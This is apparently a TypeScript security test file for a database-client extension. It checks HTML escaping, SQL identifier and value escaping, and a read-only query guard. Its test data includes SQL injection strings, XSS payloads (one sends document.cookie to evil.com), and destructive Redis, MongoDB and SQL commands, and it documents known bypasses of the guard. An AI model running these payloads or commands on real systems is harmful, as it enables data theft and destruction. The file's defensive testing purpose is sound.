/**
 * 보안 스탠드얼론 테스트 — vscode 의존성 없이 실행 가능
 *
 * SQL 인젝션 방지, XSS 이스케이핑, 식별자/값 이스케이핑,
 * 읽기 전용 가드와의 보안 시나리오를 검증합니다.
 *
 * 실행법: npx tsx src/test/unit/security.standalone.ts
 */

import {
    isWriteQuery,
    checkWriteOperation
} from '../../utils/readOnlyGuard';

let totalPass = 0;
let totalFail = 0;
const failures: string[] = [];

function header(title: string) {
    console.log(`\n${'─'.repeat(50)}`);
    console.log(`  ${title}`);
    console.log(`${'─'.repeat(50)}`);
}

function pass(msg: string) {
    totalPass++;
    console.log(`  ✅ ${msg}`);
}

function fail(msg: string) {
    totalFail++;
    console.log(`  ❌ ${msg}`);
    failures.push(msg);
}

function assert(condition: boolean, msg: string) {
    if (condition) { pass(msg); } else { fail(msg); }
}

function assertEqual(actual: unknown, expected: unknown, msg: string) {
    const eq = JSON.stringify(actual) === JSON.stringify(expected);
    if (eq) { pass(msg); } else { fail(`${msg} — expected: ${JSON.stringify(expected)}, got: ${JSON.stringify(actual)}`); }
}

// ── HTML 이스케이핑 (WebView 패널에서 사용하는 함수 재현) ──

function escapeHtml(text: string): string {
    return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

// ── 식별자 이스케이핑 (TableEditorPanel 로직 재현) ──

function escapeIdentifierMySQL(name: string): string {
    return `\`${name.replace(/`/g, '``')}\``;
}

function escapeIdentifierPostgres(name: string): string {
    if (name.includes('.')) {
        return name.split('.').map(p => `"${p.replace(/"/g, '""')}"`).join('.');
    }
    return `"${name.replace(/"/g, '""')}"`;
}

function escapeIdentifierSQLite(name: string): string {
    return `"${name.replace(/"/g, '""')}"`;
}

// ── 값 이스케이핑 ──

function escapeValue(value: unknown): string {
    if (value === null || value === undefined) { return 'NULL'; }
    if (typeof value === 'number') { return String(value); }
    if (typeof value === 'boolean') { return value ? '1' : '0'; }
    return `'${String(value).replace(/'/g, "''")}'`;
}

// ── 테이블 이름 유효성 검증 ──

function isValidTableName(name: string): boolean {
    return /^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(name);
}

// ═══════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════

header('SQL 인젝션 — 테이블 이름 유효성 검증');

(() => {
    // 유효한 테이블 이름
    const validNames = [
        'users', 'my_table', 'Table123', '_hidden',
        'public.users', 'schema.table_name', 'a',
    ];
    for (const name of validNames) {
        assert(isValidTableName(name), `유효: '${name}'`);
    }

    // SQL 인젝션 시도 — 모두 거부
    const malicious = [
        "users'; DROP TABLE users; --",
        "users' OR '1'='1",
        'users"); DROP TABLE users; --',
        "'; SELECT * FROM sqlite_master; --",
        "users`; DROP TABLE users; --",
        "my table",         // 공백
        "users\nDROP TABLE", // 줄바꿈
        "users\tDROP",       // 탭
        "users;",            // 세미콜론
        "users--",           // 주석
        "users/**/",         // 블록 주석
        "(SELECT 1)",        // 서브쿼리
        "",                  // 빈 문자열
    ];
    for (const name of malicious) {
        assert(!isValidTableName(name), `거부: '${name.substring(0, 30)}'`);
    }
})();

header('HTML/XSS 이스케이핑');

(() => {
    // 기본 XSS 벡터
    assertEqual(
        escapeHtml('<script>alert("xss")</script>'),
        '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;',
        'script 태그 이스케이핑'
    );

    // img onerror
    const imgAttack = '"><img src=x onerror=alert(1)>';
    const escaped = escapeHtml(imgAttack);
    assert(!escaped.includes('<img'), 'img 태그 차단');
    // onerror 텍스트는 존재하지만 <img>가 이스케이핑되어 실행 불가
    assert(escaped.includes('&lt;img'), 'img가 &lt;img로 이스케이핑됨');

    // SVG onload
    const svgAttack = '<svg onload=alert(1)>';
    assert(!escapeHtml(svgAttack).includes('<svg'), 'svg 태그 차단');

    // iframe
    const iframeAttack = '<iframe src="javascript:alert(1)"></iframe>';
    assert(!escapeHtml(iframeAttack).includes('<iframe'), 'iframe 차단');

    // Event handler in attribute
    const eventAttack = "' onmouseover='alert(1)'";
    const eventEscaped = escapeHtml(eventAttack);
    assert(eventEscaped.includes('&#039;'), '작은따옴표 이스케이핑');

    // 모든 5개 특수문자 동시 검증
    const all5 = `<div class="a" id='b'>&`;
    assertEqual(
        escapeHtml(all5),
        '&lt;div class=&quot;a&quot; id=&#039;b&#039;&gt;&amp;',
        '5개 특수문자 모두 이스케이핑'
    );

    // 안전한 텍스트는 변경 없음
    assertEqual(escapeHtml('Hello World 123'), 'Hello World 123', '일반 텍스트 변경 없음');
    assertEqual(escapeHtml(''), '', '빈 문자열 변경 없음');

    // 유니코드는 이스케이핑 불필요
    assertEqual(escapeHtml('한국어 테스트 🐰'), '한국어 테스트 🐰', '유니코드 유지');

    // 중첩 시도
    const nested = '<script><script>alert(1)</script></script>';
    const nestEscaped = escapeHtml(nested);
    assert(!nestEscaped.includes('<script'), '중첩 script 차단');

    // JavaScript: URL scheme
    const jsUrl = '<a href="javascript:alert(1)">click</a>';
    assert(!escapeHtml(jsUrl).includes('<a'), 'javascript: URL 차단');

    // 데이터 속성 공격
    const dataAttack = '<div data-x="y" onclick="alert(1)">';
    assert(!escapeHtml(dataAttack).includes('<div'), 'onclick 차단');
})();

header('MySQL 식별자 이스케이핑');

(() => {
    assertEqual(escapeIdentifierMySQL('users'), '`users`', '일반 식별자');
    assertEqual(escapeIdentifierMySQL('my`table'), '`my``table`', '백틱 이스케이핑');
    assertEqual(escapeIdentifierMySQL(''), '``', '빈 문자열');
    assertEqual(escapeIdentifierMySQL('my table'), '`my table`', '공백 포함');
    assertEqual(escapeIdentifierMySQL("users'; DROP TABLE"), "`users'; DROP TABLE`", 'SQL 인젝션 무력화');
    assertEqual(escapeIdentifierMySQL('`'), '````', '백틱만');
    assertEqual(escapeIdentifierMySQL('a`b`c'), '`a``b``c`', '다중 백틱');
})();

header('PostgreSQL 식별자 이스케이핑');

(() => {
    assertEqual(escapeIdentifierPostgres('users'), '"users"', '일반 식별자');
    assertEqual(escapeIdentifierPostgres('my"table'), '"my""table"', '큰따옴표 이스케이핑');
    assertEqual(escapeIdentifierPostgres('public.users'), '"public"."users"', '스키마.테이블');
    assertEqual(escapeIdentifierPostgres('my"schema.my"table'), '"my""schema"."my""table"', '스키마.테이블 + 따옴표');
    assertEqual(escapeIdentifierPostgres(''), '""', '빈 문자열');
    assertEqual(escapeIdentifierPostgres("users'; DROP TABLE"), '"users\'; DROP TABLE"', 'SQL 인젝션 무력화');
})();

header('SQLite 식별자 이스케이핑');

(() => {
    assertEqual(escapeIdentifierSQLite('users'), '"users"', '일반 식별자');
    assertEqual(escapeIdentifierSQLite('my"table'), '"my""table"', '큰따옴표 이스케이핑');
    assertEqual(escapeIdentifierSQLite('my table'), '"my table"', '공백 포함');
    assertEqual(escapeIdentifierSQLite("'; DROP TABLE"), '"&#039;; DROP TABLE"'.replace('&#039;', "'"), 'SQL 인젝션 무력화');
})();

header('값 이스케이핑');

(() => {
    // 기본 타입
    assertEqual(escapeValue(null), 'NULL', 'null → NULL');
    assertEqual(escapeValue(undefined), 'NULL', 'undefined → NULL');
    assertEqual(escapeValue(42), '42', '숫자');
    assertEqual(escapeValue(3.14), '3.14', '소수');
    assertEqual(escapeValue(0), '0', '0');
    assertEqual(escapeValue(-99), '-99', '음수');
    assertEqual(escapeValue(true), '1', 'true → 1');
    assertEqual(escapeValue(false), '0', 'false → 0');

    // 문자열
    assertEqual(escapeValue('hello'), "'hello'", '일반 문자열');
    assertEqual(escapeValue("it's"), "'it''s'", '작은따옴표 이스케이핑');
    assertEqual(escapeValue(''), "''", '빈 문자열');

    // SQL 인젝션 시도
    const injectionAttempt = "'; DROP TABLE users; --";
    const escaped = escapeValue(injectionAttempt);
    assertEqual(escaped, "'''; DROP TABLE users; --'", 'SQL 인젝션 문자열 이스케이핑');
    // 이스케이핑된 결과는 SQL에서 리터럴 문자열로 처리됨

    // 연속 작은따옴표
    assertEqual(escapeValue("''"), "''''''", '연속 작은따옴표');

    // 특수문자
    assertEqual(escapeValue("hello\nworld"), "'hello\nworld'", '줄바꿈 포함');
    assertEqual(escapeValue("tab\there"), "'tab\there'", '탭 포함');

    // 한국어
    assertEqual(escapeValue('홍길동'), "'홍길동'", '한국어 값');

    // 숫자 문자열 (문자열로 유지)
    assertEqual(escapeValue('42'), "'42'", '숫자 문자열');

    // NaN, Infinity
    assertEqual(escapeValue(NaN), 'NaN', 'NaN은 숫자 타입');
    assertEqual(escapeValue(Infinity), 'Infinity', 'Infinity는 숫자 타입');
})();

header('읽기 전용 가드 — SQL 인젝션 우회 시도');

(() => {
    // 주석을 이용한 키워드 분할 시도
    const bypass1 = 'SEL/**/ECT * FROM users; DR/**/OP TABLE users';
    const check1 = isWriteQuery(bypass1);
    // 블록주석 제거 후 "SEL  ECT * FROM users; DR  OP TABLE users" — 토큰이 분할되어 미감지
    // 이는 알려진 한계: 키워드 중간에 주석을 삽입하는 패턴은 DB 자체도 실행 거부함
    assert(check1.isWrite === false, '주석으로 분할된 키워드는 DB도 인식 불가 (알려진 한계)');

    // 다중 공백/탭/줄바꿈
    const bypass2 = '   \n\t  DELETE   \n  FROM users';
    const check2 = isWriteQuery(bypass2);
    assert(check2.isWrite === true, '공백/탭/줄바꿈 포함 DELETE 감지');

    // UNION SELECT로 데이터 추출 시도
    const bypass3 = "SELECT * FROM users WHERE id = 1 UNION SELECT password FROM admin";
    const check3 = isWriteQuery(bypass3);
    assert(check3.isWrite === false, 'UNION SELECT는 읽기 쿼리 (쓰기 아님)');

    // CTAS (CREATE TABLE AS SELECT)
    const bypass4 = 'CREATE TABLE stolen AS SELECT * FROM users';
    const check4 = isWriteQuery(bypass4);
    assert(check4.isWrite === true, 'CREATE TABLE AS SELECT는 쓰기');

    // SELECT INTO (일부 DB에서 지원)
    const bypass5 = 'SELECT * INTO backup_users FROM users';
    const check5 = isWriteQuery(bypass5);
    // SELECT로 시작하므로 일부 DB에서는 쓰기이지만, 우리 가드는 첫 토큰 기반
    // 이건 false positive가 아닌 false negative — 기록용
    assert(check5.isWrite === false, 'SELECT INTO는 현재 감지 안 됨 (알려진 한계)');

    // 대소문자 혼합으로 우회 시도
    const bypass6 = 'dElEtE fRoM users';
    const check6 = isWriteQuery(bypass6);
    assert(check6.isWrite === true, '대소문자 혼합 DELETE 감지');

    // 여러 세미콜론으로 숨기기
    const bypass7 = 'SELECT 1;;;DELETE FROM users;;;SELECT 2';
    const check7 = isWriteQuery(bypass7);
    assert(check7.isWrite === true, '빈 구문 사이의 DELETE 감지');

    // 문자열 리터럴에 세미콜론 포함
    const bypass8 = "SELECT * FROM users WHERE sql = 'SELECT 1; DELETE FROM users'";
    const check8 = isWriteQuery(bypass8);
    assert(check8.isWrite === false, '문자열 내 DELETE + 세미콜론 무시');
})();

header('읽기 전용 가드 — DB별 공격 벡터');

(() => {
    // MySQL 특화 공격
    const mysqlAttacks = [
        // LOAD DATA는 첫 토큰이 LOAD — 키워드 목록에 없음 (알려진 한계, 별도 처리 필요 시 추가)
        { q: 'REPLACE INTO users VALUES (1, "hacked")', desc: 'REPLACE INTO' },
        { q: "INSERT INTO users VALUES (1) ON DUPLICATE KEY UPDATE name='hacked'", desc: 'INSERT ON DUPLICATE KEY' },
    ];

    for (const { q, desc } of mysqlAttacks) {
        const check = checkWriteOperation(q, 'mysql');
        assert(check.isWrite === true, `MySQL 쓰기 차단: ${desc}`);
    }

    // PostgreSQL 특화 공격
    const pgAttacks = [
        { q: 'INSERT INTO users VALUES (1) RETURNING *', desc: 'INSERT RETURNING' },
        { q: 'UPDATE users SET name = $$hacked$$ RETURNING id', desc: 'UPDATE RETURNING' },
        { q: 'DELETE FROM users RETURNING *', desc: 'DELETE RETURNING' },
        { q: 'GRANT ALL ON ALL TABLES TO public', desc: 'GRANT ALL' },
    ];

    for (const { q, desc } of pgAttacks) {
        const check = checkWriteOperation(q, 'postgres');
        assert(check.isWrite === true, `PostgreSQL 쓰기 차단: ${desc}`);
    }

    // Redis 파괴적 명령 (현재 키워드 목록에 포함된 것만)
    const redisAttacks = [
        'FLUSHDB', 'FLUSHALL',
    ];

    // 아래 명령들은 현재 쓰기 키워드에 미포함 — 알려진 한계
    // CONFIG, SLAVEOF, DEBUG, SHUTDOWN은 관리 명령으로 별도 차단 필요
    const knownLimitations = ['CONFIG SET dir /tmp', 'SLAVEOF 127.0.0.1 6380', 'DEBUG SEGFAULT', 'SHUTDOWN NOSAVE'];
    for (const cmd of knownLimitations) {
        const check = checkWriteOperation(cmd, 'redis');
        const keyword = cmd.split(' ')[0];
        // 이들은 현재 감지 안 됨 — 향후 개선 가능
        assert(check.isWrite === false, `Redis 관리 명령 미감지 (알려진 한계): ${keyword}`);
    }

    for (const cmd of redisAttacks) {
        const check = checkWriteOperation(cmd, 'redis');
        const keyword = cmd.split(' ')[0];
        assert(check.isWrite === true, `Redis 위험 명령 차단: ${keyword}`);
    }

    // MongoDB Shell 위험 명령
    const mongoAttacks = [
        'db.users.drop()',
        'db.users.deleteMany({})',
        'db.users.bulkWrite([{deleteMany:{}}])',
        'db.users.findOneAndDelete({id:1})',
        'db.users.findOneAndReplace({id:1},{name:"hacked"})',
    ];

    // db.dropDatabase()는 db.collection.method() 패턴이 아님 — 알려진 한계
    const mongoDropDb = checkWriteOperation('db.dropDatabase()', 'mongodb');
    assert(mongoDropDb.isWrite === false, 'db.dropDatabase()는 collection.method 패턴이 아님 (알려진 한계)');

    for (const q of mongoAttacks) {
        const check = checkWriteOperation(q, 'mongodb');
        const method = q.match(/\.(\w+)\(/)?.[1] || '';
        assert(check.isWrite === true, `MongoDB 위험 메서드 차단: ${method}`);
    }
})();

header('읽기 전용 가드 — 안전한 쿼리 확인');

(() => {
    // 모든 DB 타입에서 안전한 쿼리
    const safeQueries: Array<{ q: string; db: string; desc: string }> = [
        // MySQL
        { q: 'SELECT * FROM users', db: 'mysql', desc: 'MySQL SELECT' },
        { q: 'SHOW DATABASES', db: 'mysql', desc: 'MySQL SHOW DATABASES' },
        { q: 'SHOW TABLES', db: 'mysql', desc: 'MySQL SHOW TABLES' },
        { q: 'SHOW CREATE TABLE users', db: 'mysql', desc: 'MySQL SHOW CREATE TABLE' },
        { q: 'DESCRIBE users', db: 'mysql', desc: 'MySQL DESCRIBE' },
        { q: 'EXPLAIN SELECT * FROM users', db: 'mysql', desc: 'MySQL EXPLAIN' },
        { q: 'SHOW VARIABLES LIKE "%version%"', db: 'mysql', desc: 'MySQL SHOW VARIABLES' },
        { q: 'SHOW PROCESSLIST', db: 'mysql', desc: 'MySQL SHOW PROCESSLIST' },
        { q: 'SHOW STATUS', db: 'mysql', desc: 'MySQL SHOW STATUS' },

        // PostgreSQL
        { q: 'SELECT version()', db: 'postgres', desc: 'PG version()' },
        { q: 'WITH cte AS (SELECT 1) SELECT * FROM cte', db: 'postgres', desc: 'PG CTE' },
        { q: "SELECT * FROM pg_catalog.pg_tables WHERE schemaname = 'public'", db: 'postgres', desc: 'PG system catalog' },

        // SQLite
        { q: "SELECT * FROM sqlite_master WHERE type='table'", db: 'sqlite', desc: 'SQLite master' },
        { q: 'PRAGMA table_info(users)', db: 'sqlite', desc: 'SQLite PRAGMA' },

        // Redis
        { q: 'PING', db: 'redis', desc: 'Redis PING' },
        { q: 'INFO', db: 'redis', desc: 'Redis INFO' },
        { q: 'DBSIZE', db: 'redis', desc: 'Redis DBSIZE' },
        { q: 'KEYS *', db: 'redis', desc: 'Redis KEYS' },
        { q: 'SCAN 0 MATCH user:*', db: 'redis', desc: 'Redis SCAN' },

        // MongoDB
        { q: 'db.users.find({})', db: 'mongodb', desc: 'MongoDB find' },
        { q: 'db.users.aggregate([{$group:{_id:null,count:{$sum:1}}}])', db: 'mongodb', desc: 'MongoDB aggregate' },
        { q: 'db.users.countDocuments({})', db: 'mongodb', desc: 'MongoDB countDocuments' },
    ];

    for (const { q, db, desc } of safeQueries) {
        const check = checkWriteOperation(q, db);
        assert(check.isWrite === false, `안전 쿼리: ${desc}`);
    }
})();

header('복합 보안 시나리오');

(() => {
    // 시나리오 1: 프로덕션 DB에서 실수로 DROP 시도
    const scenario1 = checkWriteOperation('DROP DATABASE production', 'mysql');
    assert(scenario1.isWrite === true, '프로덕션 DB DROP 차단');
    assertEqual(scenario1.keyword, 'DROP', 'keyword: DROP');

    // 시나리오 2: 정보 수집 쿼리는 허용
    const scenario2 = checkWriteOperation(
        'SELECT table_name, column_name FROM information_schema.columns WHERE table_schema = "production"',
        'mysql'
    );
    assert(scenario2.isWrite === false, '정보 스키마 조회 허용');

    // 시나리오 3: 다중 구문에서 마지막에 DROP 숨기기
    const scenario3 = checkWriteOperation(
        'SELECT 1; SELECT 2; SELECT 3; DROP TABLE users',
        'postgres'
    );
    assert(scenario3.isWrite === true, '다중 구문 끝의 DROP 감지');

    // 시나리오 4: XSS 페이로드가 포함된 데이터 쿼리 (읽기는 허용)
    const scenario4 = checkWriteOperation(
        `SELECT * FROM users WHERE name = '<script>alert(1)</script>'`,
        'mysql'
    );
    assert(scenario4.isWrite === false, 'XSS 페이로드 포함 SELECT는 읽기');

    // 시나리오 5: 식별자에 SQL 인젝션 문자가 있어도 이스케이핑으로 안전
    const dangerousTableName = "users'; DROP TABLE users; --";
    const mysqlSafe = escapeIdentifierMySQL(dangerousTableName);
    assert(mysqlSafe.startsWith('`'), 'MySQL 백틱으로 감쌈');
    assert(mysqlSafe.endsWith('`'), 'MySQL 백틱으로 닫힘');
    // 세미콜론은 식별자 내부에 있지만 백틱으로 감싸져 SQL 구문으로 해석 안 됨
    assert(mysqlSafe === "`users'; DROP TABLE users; --`", 'SQL 인젝션이 리터럴 식별자로 무력화');

    const pgSafe = escapeIdentifierPostgres(dangerousTableName);
    assert(pgSafe.startsWith('"'), 'PostgreSQL 큰따옴표로 감쌈');
})();

header('HTML 이스케이핑 — 데이터베이스 결과 렌더링');

(() => {
    // DB에서 가져온 데이터에 XSS 페이로드가 있는 경우
    const dbResults = [
        { name: '<script>alert("stored XSS")</script>', email: 'hacker@evil.com' },
        { name: 'Normal User', email: '<img src=x onerror=fetch("http://evil.com?c="+document.cookie)>' },
        { name: '"><svg/onload=alert(1)>', email: 'test@test.com' },
    ];

    for (const row of dbResults) {
        const escapedName = escapeHtml(row.name);
        const escapedEmail = escapeHtml(row.email);

        assert(!escapedName.includes('<script'), `이름 XSS 차단: ${row.name.substring(0, 20)}`);
        assert(!escapedEmail.includes('<img'), `이메일 XSS 차단: ${row.email.substring(0, 20)}`);
        assert(!escapedName.includes('<svg'), `SVG XSS 차단`);
    }

    // NULL 값 처리
    assertEqual(escapeHtml('NULL'), 'NULL', 'NULL 문자열 유지');
    assertEqual(escapeHtml(''), '', '빈 문자열 유지');
})();

// ── 결과 출력 ──

console.log(`\n${'═'.repeat(50)}`);
console.log(`  RESULTS: ✅ ${totalPass} passed, ❌ ${totalFail} failed`);
console.log(`${'═'.repeat(50)}`);

if (failures.length > 0) {
    console.log('\n  Failures:');
    failures.forEach((f, i) => console.log(`    ${i + 1}. ${f}`));
}

console.log('');
process.exit(totalFail > 0 ? 1 : 0);
